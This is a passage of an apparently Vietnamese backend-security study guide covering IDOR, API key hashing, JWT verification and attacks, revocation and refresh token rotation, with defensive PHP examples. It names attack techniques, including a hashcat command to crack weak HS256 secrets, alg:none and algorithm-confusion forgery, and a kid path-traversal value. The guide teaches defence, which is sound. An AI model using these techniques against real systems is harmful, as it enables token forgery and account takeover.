| Tra cứu khi xác thực | Lấy user theo email, rồi verify hash | Tra thẳng `WHERE key_hash = ?` bằng index |

Điểm cuối trong bảng là lý do thực dụng: vì SHA-256 deterministic và không salt, server tìm được
key bằng một lần tra index. Nếu dùng bcrypt có salt thì mỗi request phải thử verify với mọi key
trong bảng. Laravel Sanctum cũng lưu SHA-256 của personal access token theo cách này. Token reset
password, token xác nhận email, refresh token (module 2.2) cùng lý luận: ngẫu nhiên, entropy cao,
lưu SHA-256.

⚠️ Lập luận trên chỉ đúng khi key thật sự ngẫu nhiên từ CSPRNG. Key "tự đặt" kiểu `acme-prod-2024`
có entropy thấp như password.

**Tóm tắt nhanh**
- Authentication là "bạn là ai", authorization là "bạn được làm gì với object này"; middleware
  `auth` chỉ làm cái đầu.
- IDOR/BOLA (API1:2023): nhận id mà không kiểm tra object thuộc về ai. Sửa bằng scope query theo
  user (`$request->user()->orders()->findOrFail($id)`) hoặc Policy, ở mọi endpoint đọc lẫn ghi.
- UUID chỉ là lớp phòng thủ thêm, không thay được kiểm tra quyền.
- BFLA là lỗi theo chiều dọc: ẩn nút ở UI không phải phân quyền. Deny by default, kiểm tra ở
  server, fail secure.
- API key: CSPRNG, có prefix, lưu SHA-256, hiện một lần, có scope và hạn. SHA-256 đủ vì entropy
  của key cực cao, khác password.

**Nguồn**: [OWASP: Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html) ·
[OWASP: IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) ·
[OWASP API Security Top 10: API1:2023 BOLA](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/) ·
[PortSwigger: Access control](https://portswigger.net/web-security/access-control)

---

## Chặng 2: Làm chủ

### 2.1 JWT

Module này trả lời: một JWT thực chất chứa gì và ai đọc được, HS256 khác RS256/ES256 ở chỗ nào
quyết định kiến trúc, verify một JWT phải kiểm tra những gì theo thứ tự nào, và các tấn công kinh
điển (`alg: none`, algorithm confusion, `kid`/`jku`, nhầm loại token) khai thác đúng chỗ nào của
việc verify cẩu thả.

#### JWT là gì

*JWT* (JSON Web Token, RFC 7519) là một định dạng để đóng gói các *claim* (khẳng định về một chủ
thể, ví dụ "đây là user 42, hết hạn lúc X") thành một chuỗi gọn, đi được trong header HTTP và URL.
Bản thân JWT chỉ là định dạng; việc bảo vệ do hai chuẩn đi kèm:

- *JWS* (JSON Web Signature): token được **ký**. Gần như mọi JWT bạn gặp là JWS.
- *JWE* (JSON Web Encryption): token được **mã hoá**, người ngoài không đọc được payload.

Một JWS dạng compact gồm ba phần base64url nối bằng dấu chấm:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwMDAwMDAwfQ.<signature>
|---------------- header -----------| |------------------------ payload ------------------------|
```

```sh
# Header dài 36 ký tự (bội số của 4) nên base64 -d giải được trực tiếp
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
# {"alg":"HS256","typ":"JWT"}
```

Payload ở trên giải ra `{"sub":"42","role":"user","exp":1790000000}`. Không cần key nào, vì đây
chỉ là encode.

- *Header*: `alg` (thuật toán ký), `typ` (loại token), `kid` (id của key dùng để ký, để bên verify
  chọn đúng key khi có nhiều key).
- *Payload*: các claim. Nhóm *registered claim* có tên chuẩn:

  | Claim | Nghĩa |
  |---|---|
  | `iss` (issuer) | Bên phát hành token |
  | `sub` (subject) | Chủ thể, thường là user id |
  | `aud` (audience) | Token được phát cho ai dùng (service nào) |
  | `exp` (expiration) | Hết hạn lúc nào, dạng số giây từ epoch (1790000000 là 21/09/2026 14:13:20 UTC) |
  | `nbf` (not before) | Chưa được dùng trước thời điểm này |
  | `iat` (issued at) | Phát hành lúc nào |
  | `jti` (JWT ID) | Id duy nhất của token, dùng để chống dùng lại hoặc thu hồi (module 2.2) |

- *Signature*: ký trên chuỗi `base64url(header) + "." + base64url(payload)`. Với HS256:
  `HMACSHA256(base64url(header) + "." + base64url(payload), secret)`. Đổi một byte ở header hay
  payload là chữ ký không còn khớp.

⚠️ Payload chỉ được encode, không mã hoá. Ai cầm token (user, extension trình duyệt, log của
proxy) cũng đọc được. Không đặt dữ liệu nhạy cảm vào token; cần giấu thì dùng JWE hoặc dùng
*opaque token* (chuỗi ngẫu nhiên, server tra DB để biết nghĩa). RFC 9068 còn nói thêm một ý hay:
client **không được** đọc nội dung access token để ra quyết định, vì server có quyền đổi định dạng
token bất cứ lúc nào; với client, access token phải được coi là chuỗi mờ.

Các lưu ý vận hành từ jwt.io: token sống ngắn; không nhồi mọi permission vào token vì một số server
từ chối header lớn hơn khoảng 8 KB; gửi token qua header `Authorization: Bearer <token>`. Thêm một
nguyên tắc chung: không đặt token trong URL (URL bị ghi vào log, lịch sử trình duyệt, header `Referer`).

#### Hai kiểu ký

| | HS256 (HMAC) | RS256 / ES256 / EdDSA (chữ ký số) |
|---|---|---|
| Key | Một secret chung (đối xứng) | Cặp private/public key (bất đối xứng) |
| Ai ký được | Bất kỳ ai có secret | Chỉ bên giữ private key |
| Ai verify được | Bất kỳ ai có secret | Bất kỳ ai có public key |
| Phân phối key | Phải chia secret cho mọi bên verify, qua kênh bí mật | Công bố public key qua *JWKS* (JSON Web Key Set, một URL trả danh sách public key, thường khai trong metadata dưới tên `jwks_uri`) |
| Rotate key | Phải đổi đồng loạt ở mọi nơi | Thêm key mới vào JWKS với `kid` mới, ký bằng key mới, gỡ key cũ sau khi token cũ hết hạn |
| Hợp khi | Một service vừa ký vừa verify | Nhiều service verify, chỉ một nơi ký |

- ⚠️ Với HS256, service nào verify được thì cũng **ký được**. Chia secret cho 5 service là có 5
  nơi, chỉ cần một nơi bị lộ, là giả được token cho cả hệ thống.
- ⚠️ Secret của HS256 phải là chuỗi ngẫu nhiên đủ dài, không phải password người đặt. RFC 8725 cấm
  dùng password dễ nhớ trực tiếp làm key HMAC; RFC 7518 yêu cầu key của HS256 dài ít nhất bằng
  output của hash, tức 256 bit. Secret yếu thì chỉ cần **một** token hợp lệ là kẻ tấn công brute
  force offline được, ví dụ bằng `hashcat -a 0 -m 16500 <jwt> <wordlist>` với danh sách secret
  hay gặp (PortSwigger). Secret copy từ tutorial như `your-256-bit-secret` nằm sẵn trong các
  wordlist đó.
- Trong nhóm bất đối xứng: RS256 phổ biến nhất (tương thích rộng), chữ ký lớn. ES256 (ECDSA P-256)
  và EdDSA (Ed25519) cho key và chữ ký nhỏ hơn nhiều. RFC 8725 lưu ý ECDSA cần một giá trị ngẫu
  nhiên riêng cho mỗi lần ký; chỉ cần giá trị này đoán được vài bit là có thể lộ private key, nên
  thư viện nên dùng biến thể deterministic của RFC 6979. Ed25519 deterministic ngay từ thiết kế.
- RFC 9068 khuyến nghị authorization server ký JWT access token bằng thuật toán bất đối xứng, và
  công bố key qua `jwks_uri` trong metadata.

Hệ 5 service, một auth service phát token: chọn ES256 (hoặc EdDSA nếu mọi thư viện trong hệ đều
hỗ trợ). Auth service giữ private key, 4 service còn lại tải JWKS và cache. Service nào bị chiếm
cũng chỉ lộ public key, không giả được token.

#### Verify một JWT: kiểm tra những gì

Nguyên tắc nền: header và payload là **input của kẻ tấn công** cho tới khi chữ ký được verify, và
thuật toán được dùng phải do server quyết định, không phải do header quyết định.

1. **Tách và parse**: đúng 3 phần, mỗi phần base64url hợp lệ, JSON hợp lệ (UTF-8).
2. **Chọn key và thuật toán từ cấu hình phía server**. Nếu có `kid`, chỉ dùng nó để tra trong tập
   key đã biết trước. Mỗi key gắn đúng một thuật toán (RFC 8725 mục 3.1); `alg` trong header phải
   khớp thuật toán của key đó, không khớp thì từ chối. `none` không bao giờ nằm trong whitelist.
3. **Verify chữ ký**. Sai thì dừng ngay, không đọc claim.
4. **`typ`**: nếu hệ có nhiều loại JWT, kiểm tra đúng loại (access token theo RFC 9068 có
   `typ: at+jwt`).
5. **`iss`**: khớp **chính xác** bên phát hành mình tin, và key vừa dùng phải thuộc về issuer đó
   (RFC 8725 mục 3.8).
6. **`aud`**: chứa định danh của chính service này. Thiếu hoặc không khớp thì từ chối (RFC 8725 mục
   3.9).
7. **`exp`** (bắt buộc có) và **`nbf`**: so với giờ hiện tại, cho phép *leeway* nhỏ để bù *clock
   skew* (đồng hồ các server lệch nhau). RFC 9068 ghi leeway "thường không quá vài phút"; thực tế
   hay đặt vài chục giây tới một phút.
8. **Claim nghiệp vụ**: `sub` phải là user hợp lệ; `scope` đủ cho thao tác. Đây mới là bước
   authorization (module 1.5, 2.5).

Thiếu bước nào thì lỗ hổng nào:

| Thiếu | Hậu quả |
|---|---|
| Bước 2 (tin `alg` trong header) | `alg: none`, algorithm confusion |
| Bước 3 (chỉ decode, không verify) | Sửa payload tuỳ ý, ví dụ `"role":"admin"` |
| Bước 4, 6 | Dùng ID token làm access token, dùng token của service A để gọi service B |
| Bước 5 | Token do issuer khác (dùng chung hạ tầng) phát cũng được chấp nhận |
| Bước 7 | Token bị lộ dùng được mãi mãi |

Với thư viện `firebase/php-jwt` (phổ biến trong PHP), cấu hình đúng trông như sau:

```php
<?php
declare(strict_types=1);

use Firebase\JWT\JWT;
use Firebase\JWT\Key;

JWT::$leeway = 60; // giây, bù clock skew

// Key gắn cứng với thuật toán: token có alg khác 'ES256' bị từ chối
$claims = JWT::decode($jwt, new Key($publicKeyPem, 'ES256'));

// Nhiều key theo kid: mỗi kid map tới một Key có thuật toán riêng
// $claims = JWT::decode($jwt, ['key-2026-09' => new Key($pemA, 'ES256'), ...]);

// php-jwt chỉ kiểm tra exp/nbf/iat KHI CÓ trong payload, và không kiểm tra iss/aud.
// Phần còn lại phải tự làm:
if (!isset($claims->exp)) {
    throw new UnexpectedValueException('Token thiếu exp');
}
if (($claims->iss ?? null) !== 'https://auth.example.com') {
    throw new UnexpectedValueException('Sai issuer');
}
$aud = (array) ($claims->aud ?? []);          // aud có thể là chuỗi hoặc mảng
if (!in_array('https://orders.example.com', $aud, true)) {
    throw new UnexpectedValueException('Sai audience');
}
```

⚠️ Điểm dễ sót nhất ở trên: token **không có** `exp` vẫn qua được `JWT::decode`. Đọc mã nguồn của
thư viện mình dùng để biết nó kiểm tra những gì, đừng đoán.

#### Các tấn công kinh điển

**Decode thay vì verify.** Nhiều thư viện có cả hàm `decode` (chỉ parse) lẫn `verify`. Dev dùng
`decode` vì "chạy được" là token giả nào cũng qua. PortSwigger đặt lỗi này đầu tiên trong nhóm lỗi verify chữ ký.

**`alg: none`.** Chuẩn JWS có thuật toán `none` cho token không ký (dùng khi đã được bảo vệ bằng
cách khác). Kẻ tấn công đổi header thành `{"alg":"none"}`, sửa payload, bỏ phần chữ ký (vẫn giữ dấu
chấm cuối: `header.payload.`). Thư viện tin `alg` trong header sẽ "verify" bằng cách không làm gì.
Chặn bằng tên (`alg !== 'none'`) cũng chưa chắc đủ: PortSwigger ghi nhận có filter bị vượt bằng
viết hoa lẫn lộn (`NoNe`) hoặc encoding lạ. Cách sửa đúng là whitelist thuật toán theo key (bước 2),
và RFC 8725 khuyến nghị (SHOULD NOT) thư viện không nhận `none` trừ khi caller yêu cầu rõ.

**Algorithm confusion** (còn gọi key confusion; CVE-2015-9235 là một ví dụ thực tế). Gốc của lỗi
là hàm verify kiểu "một key cho mọi thuật toán":

```
// Pseudo-code của thư viện có lỗi (theo PortSwigger)
function verify(token, secretOrPublicKey) {
    algorithm = token.getAlgHeader();          // lấy từ header, tức từ kẻ tấn công
    if (algorithm == "RS256") { /* dùng key như RSA public key */ }
    else if (algorithm == "HS256") { /* dùng key như HMAC secret */ }
}

// Code ứng dụng: nghĩ rằng chỉ có RS256 nên truyền public key
verify(request.getCookie("session"), publicKey);
```

1. Server ký bằng RS256 và verify bằng public key. Public key vốn công khai: kẻ tấn công lấy từ
   `/jwks.json`, `/.well-known/jwks.json`, hoặc tính ngược từ hai token có sẵn (công cụ như
   `rsa_sign2n`).
2. Kẻ tấn công chuyển public key về đúng định dạng server đang lưu (thường là PEM X.509), khớp
   **từng byte**, kể cả xuống dòng cuối.
3. Hắn sửa payload (ví dụ `"sub":"admin"`), đổi header thành `alg: HS256`, rồi ký HMAC-SHA256 với
   "secret" là chuỗi public key đó.
4. Server đọc `alg: HS256`, lấy key đang cấu hình (public key) làm secret HMAC, tính ra đúng chữ ký
   mà kẻ tấn công đã tính. Token giả được chấp nhận.

Sửa: key nào đi với thuật toán đó, kiểm tra lúc verify (RFC 8725 mục 3.1). Trong `firebase/php-jwt`,
object `Key($pem, 'RS256')` làm đúng việc này: token mang `alg: HS256` bị từ chối với lỗi "Incorrect
key for this algorithm".

**Tiêm key qua header.** Các header `jwk`, `jku`, `x5u`, `kid` cho phép token tự nói "hãy verify tôi
bằng key này". Mọi thứ trong header đều do kẻ tấn công kiểm soát:

- `jwk`: nhúng thẳng public key vào header. Server cấu hình sai sẽ dùng key đó, tức là kẻ tấn công
  tự tạo cặp key, ký bằng private key của hắn, nhúng public key vào token.
- `jku` (JWK Set URL) / `x5u` (URL tới certificate X.509): server tải key từ URL trong header. Kẻ
  tấn công trỏ về server của hắn; đồng thời đây là cửa cho *SSRF* (server bị lừa gọi tới địa chỉ nội
  bộ). Nếu buộc phải hỗ trợ thì whitelist chính xác URL được phép; PortSwigger lưu ý filter URL lỏng
  bị vượt qua khác biệt trong cách parse URL.
- `kid`: server dùng giá trị này để tìm key. Nếu `kid` được ghép vào đường dẫn file, kẻ tấn công
  gửi `"kid": "../../../../dev/null"`: file rỗng, secret là chuỗi rỗng, và hắn ký HMAC bằng chuỗi
  rỗng. Nếu `kid` được ghép vào câu SQL thì là SQL injection.
- Sửa chung: key chỉ lấy từ cấu hình hoặc JWKS của issuer đã biết trước (lấy qua `jwks_uri` của
  metadata, không phải từ header token). `kid` chỉ là khoá tra trong map đó, không bao giờ là đường
  dẫn hay mảnh SQL.

**Nhầm loại token** (*substitution*, *cross-JWT confusion*, RFC 8725 mục 2.7, 2.8). Một issuer
thường phát nhiều loại JWT cùng định dạng, cùng key: ID token của OIDC (chứng minh user đã đăng nhập
vào client, module 2.3), access token cho từng API, token xác nhận email. Nếu API chỉ verify chữ
ký thì:

- Client lấy ID token (có `aud` là client id) gửi cho API như access token.
- Service A nhận access token hợp lệ của user, rồi dùng chính token đó gọi service B với quyền của
  user.

Cách chặn theo RFC 8725 mục 3.11, 3.12 và RFC 9068:

- *Explicit typing*: đặt `typ` riêng cho mỗi loại, và bên verify kiểm tra nó. RFC 9068 bắt resource
  server từ chối access token có `typ` khác `at+jwt` (hoặc `application/at+jwt`). ID token của OIDC
  không mang `typ` này, nên không dùng thay được.
- `aud` riêng cho từng API: RFC 9068 yêu cầu authorization server dùng `aud` khác nhau cho token
  phát cho các resource khác nhau.
- Có thể dùng thêm: key khác nhau, issuer khác nhau, tập claim bắt buộc khác nhau cho mỗi loại, sao
  cho quy tắc verify của các loại loại trừ lẫn nhau.

**Claim là input.** `sub`, `kid`, `iss` được dùng để tra DB, LDAP, URL, nên phải được validate như
mọi input khác để không thành đường injection hoặc SSRF (RFC 8725 mục 2.9, 3.10).

*JWT BCP* (RFC 8725, 02/2020) gom các khuyến nghị trên vào một văn bản ngắn. *BCP* (Best Current
Practice) là loại RFC ghi lại cách làm được khuyến nghị hiện tại. Mục 2 liệt kê mối đe doạ, mục 3
là cách phòng, mỗi mối đe doạ trỏ sang mục phòng tương ứng.

**Tóm tắt nhanh**
- JWT = `base64url(header).base64url(payload).signature`; payload ai cũng đọc được, chỉ chữ ký là
  bảo vệ.
- HS256: ai verify được cũng ký được, secret phải ngẫu nhiên ≥ 256 bit. Nhiều service verify thì
  dùng ES256/EdDSA/RS256 và JWKS.
- Verify: key và thuật toán do server quyết định (mỗi key một thuật toán), chữ ký trước, rồi `typ`,
  `iss`, `aud`, `exp`/`nbf` có leeway nhỏ.
- `alg: none` và algorithm confusion cùng một gốc: tin `alg` trong header. `kid`/`jku`/`jwk` là
  input của kẻ tấn công.
- Chống nhầm loại token bằng `typ` (`at+jwt`) và `aud` riêng cho mỗi API.
- Biết thư viện của mình kiểm tra gì: `firebase/php-jwt` không bắt buộc `exp`, không kiểm tra
  `iss`/`aud`.

**Nguồn**: [RFC 8725: JWT Best Current Practices](https://www.rfc-editor.org/rfc/rfc8725) ·
[RFC 9068: JWT Profile for OAuth 2.0 Access Tokens](https://www.rfc-editor.org/rfc/rfc9068) ·
[PortSwigger: JWT attacks](https://portswigger.net/web-security/jwt) ·
[PortSwigger: Algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion) ·
[jwt.io introduction](https://jwt.io/introduction) ·
[firebase/php-jwt](https://github.com/firebase/php-jwt) (README và `src/JWT.php`)

---

### 2.2 Vòng đời token: revocation, refresh, nơi lưu, BFF

Module này trả lời: khi đã dùng token (thường là JWT) thì đăng xuất, đổi password, lộ token được xử
lý thế nào; refresh token xoay vòng ra sao để phát hiện bị trộm; và trên trình duyệt token nên nằm ở
đâu, hay tốt nhất là không nằm ở trình duyệt (mô hình BFF).

#### Vì sao JWT khó thu hồi

Nhắc lại từ [module 2.1](#21-jwt): server nhận một JWT, verify chữ ký, kiểm tra `exp`, `iss`, `aud`
là tin. Không có bước "tra DB xem token này còn hiệu lực không". Đó là ý nghĩa của *stateless*
(không giữ trạng thái phía server) và cũng là lý do JWT scale dễ: service nào có public key là tự
verify được.

Mặt trái: token đã phát ra thì **sống tới `exp`**, bất kể user đã bấm đăng xuất, đổi password hay bị
admin khoá. So với session truyền thống ([module 1.2](#12-session-và-cookie)), nơi xoá một dòng
session là user bị đá ra ngay, đây là khác biệt lớn nhất.

Có bốn cách xử lý, thường kết hợp với nhau:

| Cách | Cơ chế | Độ trễ thu hồi | Chi phí |
|---|---|---|---|
| Access token sống ngắn + refresh token | Access token 5–15 phút; refresh token lưu ở server, thu hồi được | Tối đa bằng tuổi access token | Thêm luồng refresh |
| Denylist theo `jti` | Lưu id của token bị thu hồi, mỗi request tra | Gần như tức thì | Tra Redis mỗi request |
| `token_version` trong bảng user | Token mang version; tăng version là mọi token cũ bị từ chối | Tức thì nếu tra mỗi request | Tra DB/cache mỗi request |
| Token Status List | Bên phát hành công bố danh sách trạng thái nén, token trỏ tới vị trí của mình | Bằng chu kỳ cache danh sách | Hạ tầng phát hành list |

*Access token ngắn + refresh token* là cách nền. Access token (token dùng để gọi API) sống vài phút,
nên nếu lộ thì thiệt hại có giới hạn thời gian. Khi hết hạn, client dùng *refresh token* (token sống
lâu, chỉ dùng để xin access token mới, chỉ gửi tới authorization server) để lấy access token mới.
Refresh token nằm trong DB, nên thu hồi được: xoá hoặc đánh dấu revoked là lần refresh sau thất bại.
Đăng xuất = thu hồi refresh token; access token hiện tại vẫn sống nốt vài phút còn lại.

*Denylist theo `jti`*: `jti` (JWT ID) là claim chứa id duy nhất của token. Khi thu hồi, ghi `jti` vào
Redis với TTL bằng thời gian còn lại tới `exp` (sau `exp` thì token tự chết, không cần nhớ nữa):

```sh
# Thu hồi token có jti=8f2c..., còn 540 giây nữa tới exp
redis-cli SET revoked:jti:8f2c... 1 EX 540
# Mỗi request: có key là từ chối
redis-cli EXISTS revoked:jti:8f2c...
```

⚠️ OWASP JWT Cheat Sheet cảnh báo: khoá của denylist nên là claim (`jti` kèm `iss`), **không** phải
chuỗi token thô hay `SHA-256(token)`. Lý do là *JWT malleability*: một token bị thu hồi có thể được
viết lại thành chuỗi khác mà vẫn qua verify chữ ký (parser JWT dễ dãi, hoặc chữ ký ECDSA vốn có thể
biến đổi mà vẫn hợp lệ). Chuỗi khác thì hash khác, denylist bị lách.

*`token_version`*: thêm cột `token_version INT` vào bảng `users`, nhét giá trị đó vào claim khi phát
token. Middleware so claim với giá trị hiện tại (đọc từ cache). Đổi password, "đăng xuất mọi thiết
bị", admin khoá tài khoản: tăng version một đơn vị, mọi token cũ lệch version và bị từ chối. Ưu điểm
so với denylist: không cần biết danh sách token đã phát, một lệnh `UPDATE` là xong.

```php
<?php
declare(strict_types=1);

// Trong middleware, sau khi đã verify chữ ký và exp/iss/aud (module 2.1)
function assertTokenVersion(array $claims, int $currentVersion): void
{
    // $currentVersion đọc từ cache (vd Redis) theo $claims['sub'], xoá cache khi tăng version
    if (!isset($claims['ver']) || $claims['ver'] !== $currentVersion) {
        throw new RuntimeException('Token đã bị thu hồi, đăng nhập lại');
    }
}
```

*Token Status List* là hướng OWASP JWT Cheat Sheet nhắc tới cho bài toán thu hồi ở quy mô lớn: JWT
chứa claim `status` trỏ tới URI của một danh sách và chỉ số của mình trong danh sách; bên nhận tải
danh sách (nén, gom trạng thái của nhiều token) để biết token còn hiệu lực không. Đặc tả này đang ở
dạng Internet-Draft của IETF, kiểm tra trạng thái trước khi dùng.

⚠️ Trade-off phải nói ra khi trả lời phỏng vấn: denylist hay `token_version` nghĩa là **mỗi request
lại tra state**. Khi đó lợi ích "stateless" mất phần lớn, và bạn nên tự hỏi có cần JWT không. Chính
OWASP JWT Cheat Sheet khuyên cân nhắc dùng session thường nếu đằng nào cũng cần danh sách thu hồi.
Câu trả lời tốt thường là: access token ngắn (chấp nhận độ trễ vài phút cho các thao tác thường), và
chỉ các thao tác nhạy cảm (đổi email, chuyển tiền) mới tra `token_version` để có hiệu lực tức thì.

Thiết kế "đổi password thì đăng xuất mọi thiết bị" cho hệ JWT, gom lại:

1. Thu hồi toàn bộ refresh token của user (mọi family, xem nhóm dưới).
2. Tăng `token_version`.
3. Chấp nhận: service nào chỉ verify chữ ký mà không tra version thì token cũ còn sống tối đa bằng
   tuổi access token (ví dụ 10 phút). Nói rõ con số này với product.
4. Session web (nếu có) cũng phải huỷ. Laravel có `Auth::logoutOtherDevices($password)` cho guard
   session (cần middleware `auth.session`).

#### Refresh token rotation và reuse detection

Refresh token là mục tiêu béo bở vì nó mang **toàn bộ quyền** đã cấp cho client và sống lâu. RFC 9700
(mục 4.14.2) yêu cầu authorization server, với *public client* (client không giữ được secret: SPA,
mobile), phải dùng một trong hai cách để phát hiện refresh token bị dùng lại bởi kẻ gian:

- *Sender-constrained refresh token*: gắn token với key của đúng client instance (mTLS, DPoP; module
  [3.1](#31-oauth-nâng-cao-token-gắn-người-giữ-par-sso)). Trộm token mà không có key thì vô dụng.
- *Refresh token rotation*: đây là cách phổ biến, phân tích dưới đây.

Với *confidential client* (client có backend giữ secret), RFC 6749 đã yêu cầu refresh token chỉ dùng
được bởi đúng client đó, kèm xác thực client, nên kẻ trộm token mà không có secret thì không dùng được.

Rotation hoạt động thế nào:

1. User đăng nhập, nhận access token A1 và refresh token R1. R1 mở ra một *family* (chuỗi token sinh
   từ cùng một lần đăng nhập).
2. A1 hết hạn. Client gửi R1, nhận A2 và **R2 mới**. R1 bị đánh dấu "đã dùng", nhưng server vẫn nhớ
   R1 thuộc family nào.
3. Lần sau client gửi R2, nhận R3, và cứ thế.
4. *Reuse detection*: nếu một token **đã dùng** (ví dụ R1) lại được gửi lên, có nghĩa là hai bên đang
   cùng giữ nó. Server không biết bên nào là kẻ trộm, nên **thu hồi cả family**. Cả hai phải đăng
   nhập lại.

Hai kịch bản (theo tài liệu Auth0):

| Kịch bản | Diễn biến | Kết quả |
|---|---|---|
| User dùng trước | User đổi R1 lấy R2. Kẻ trộm gửi R1 | Reuse, family bị thu hồi, R2 chết. Kẻ trộm không được gì |
| Kẻ trộm dùng trước | Kẻ trộm đổi R1 lấy R2. User gửi R1 | Reuse, family bị thu hồi. Kẻ trộm chỉ còn access token ngắn hạn |

Các quy tắc đi kèm (RFC 9700 mục 4.14.2 và RFC 10017 mục 6.3.2.3):

- Refresh token phải gắn với scope và resource server mà user đã đồng ý.
- Phải có hạn: hoặc hạn tối đa, hoặc hết hạn khi không dùng một thời gian (inactivity).
- ⚠️ Token mới sinh ra khi xoay **không được kéo dài** hạn vượt quá hạn của token đầu tiên. Ví dụ của
  RFC 10017: access token 10 phút, refresh token 8 giờ; sau 10 phút đổi được refresh token mới chỉ
  còn 7 giờ 50 phút; hết 8 giờ tính từ lúc đăng nhập thì phải đăng nhập lại. Nếu không có quy tắc
  này, kẻ trộm cứ xoay mãi là giữ quyền vô hạn.
- Server được phép tự thu hồi refresh token khi có sự kiện bảo mật: đổi password, đăng xuất ở
  authorization server.
- Lưu refresh token dạng **hash** (SHA-256 là đủ vì token là chuỗi ngẫu nhiên dài, không phải
  password người đặt), gắn với thiết bị để hiển thị "các phiên đang đăng nhập" và thu hồi từng cái.

⚠️ Báo nhầm reuse. Hai tab (hoặc app retry khi mạng chập chờn) cùng gửi R1 gần như đồng thời:

| Bước | Tab 1 | Tab 2 | Server |
|---|---|---|---|
| 1 | Gửi R1 | | R1 hợp lệ, trả R2, đánh dấu R1 đã dùng |
| 2 | | Gửi R1 (request đã bay trước khi Tab 1 nhận R2) | R1 đã dùng: reuse! Thu hồi family |
| 3 | Gửi R2 ở lần refresh sau | | Family đã chết, bắt đăng nhập lại |

User không làm gì sai mà bị đá ra. Hai cách sửa:

- *Grace period* (khoảng ân hạn): chấp nhận token vừa dùng thêm vài giây. Auth0 gọi đây là
  *Rotation Overlap Period* (tham số `leeway`, tính bằng giây, mặc định tắt). Đánh đổi: trong vài
  giây đó kẻ trộm cũng dùng lại được.
- Đồng bộ phía client: chỉ một tab làm refresh (dùng lock giữa các tab như Web Locks API hoặc
  BroadcastChannel để báo token mới cho tab khác), hoặc đẩy toàn bộ việc refresh về server (BFF,
  nhóm cuối).

Ví dụ tự chứa, chạy `php rotation.php` (PHP 8.0+), dùng mảng thay cho DB để thấy logic:

```php
<?php
declare(strict_types=1);

final class RefreshTokenStore
{
    private const GRACE_SECONDS = 5;

    /** @var array<string, array{family: string, userId: int, usedAt: ?int, expiresAt: int}> */
    private array $rows = [];          // khoá là SHA-256 của token, không lưu token thô

    /** @var array<string, true> */
    private array $revokedFamilies = [];

    /** Đăng nhập: mở family mới. Hạn tuyệt đối tính từ lúc đăng nhập. */
    public function login(int $userId, int $now, int $lifetime): string
    {
        return $this->issue($userId, bin2hex(random_bytes(8)), $now + $lifetime);
    }

    /** Đổi refresh token cũ lấy token mới; ném exception khi phải đăng nhập lại. */
    public function rotate(string $token, int $now): string
    {
        $row = $this->rows[hash('sha256', $token)] ?? throw new RuntimeException('token lạ');

        if (isset($this->revokedFamilies[$row['family']])) {
            throw new RuntimeException('family đã bị thu hồi');
        }
        if ($now >= $row['expiresAt']) {
            throw new RuntimeException('hết hạn tuyệt đối');
        }
        if ($row['usedAt'] !== null && $now - $row['usedAt'] > self::GRACE_SECONDS) {
            $this->revokedFamilies[$row['family']] = true;   // reuse detection
            throw new RuntimeException('reuse, thu hồi cả family');
        }

        $this->rows[hash('sha256', $token)]['usedAt'] ??= $now;
        // Token mới cùng family, KHÔNG kéo dài hạn tuyệt đối
        return $this->issue($row['userId'], $row['family'], $row['expiresAt']);
    }

    private function issue(int $userId, string $family, int $expiresAt): string
    {
        $token = bin2hex(random_bytes(32));
        $this->rows[hash('sha256', $token)] = [
            'family' => $family, 'userId' => $userId, 'usedAt' => null, 'expiresAt' => $expiresAt,
        ];
        return $token;
    }
}

function attempt(string $label, callable $fn): ?string
{
    try {
        $result = $fn();
        echo "$label: OK\n";
        return $result;
    } catch (RuntimeException $e) {
        echo "$label: LỖI ({$e->getMessage()})\n";
        return null;
    }
}

$store = new RefreshTokenStore();
$r1 = $store->login(userId: 42, now: 1_000, lifetime: 30 * 86_400);

$r2 = attempt('Tab 1 đổi R1', fn () => $store->rotate($r1, 1_600));
attempt('Tab 2 đổi R1 sau 2 giây', fn () => $store->rotate($r1, 1_602));
attempt('Kẻ trộm đổi R1 sau 1 giờ', fn () => $store->rotate($r1, 5_200));
attempt('User đổi R2', fn () => $store->rotate((string) $r2, 5_201));

// Output:
// Tab 1 đổi R1: OK
// Tab 2 đổi R1 sau 2 giây: OK
// Kẻ trộm đổi R1 sau 1 giờ: LỖI (reuse, thu hồi cả family)
// User đổi R2: LỖI (family đã bị thu hồi)
```

Điểm cần để ý trong code: `usedAt` chỉ ghi ở lần dùng đầu (`??=`), nên grace period tính từ lần đầu
chứ không bị lần dùng trong grace kéo dài ra. Trong DB thật, bước "kiểm tra `usedAt` rồi ghi" phải
nguyên tử (`UPDATE ... SET used_at = ? WHERE token_hash = ? AND used_at IS NULL` rồi xem số dòng bị
ảnh hưởng), nếu không hai request song song cùng thấy `NULL` (race condition kiểu check-then-act, xem
[03-database-sql.md#26-lock-thực-dụng](03-database-sql.md#26-lock-thực-dụng)).

⚠️ Giới hạn của rotation mà RFC 10017 (mục 5.1.2) chỉ ra: nếu kẻ tấn công chạy được JS trong trang
và trộm token **liên tục** (ví dụ mỗi 10 giây), hắn luôn có token mới nhất. Hắn có thể xoá token của
app hoặc đợi user đóng tab, để app không bao giờ dùng lại token cũ, và reuse detection không bao giờ
kích hoạt. Rotation phát hiện được trộm một lần, không chống được kẻ đang ở trong trang.

#### Lưu token ở đâu trên trình duyệt

Câu hỏi này chỉ đặt ra khi JS trong trình duyệt phải cầm token. Trước khi so sánh, cần hiểu mối đe
doạ chính mà RFC 10017 (mục 5) phân tích: **JavaScript độc** chạy trong origin của app (qua XSS, hoặc
một thư viện bên thứ ba bị chiếm). Code độc có **cùng quyền** với code thật: đọc được mọi biến, gọi
được mọi hàm, sửa được hàm có sẵn, gửi request tới backend như app thật. RFC liệt kê bốn kịch bản:

1. *Single-execution token theft*: đọc token trong storage một lần, gửi về server kẻ tấn công.
2. *Persistent token theft*: cài vòng lặp trộm token liên tục, luôn có bản mới nhất (vô hiệu hoá
   token ngắn hạn và rotation như đã nói).
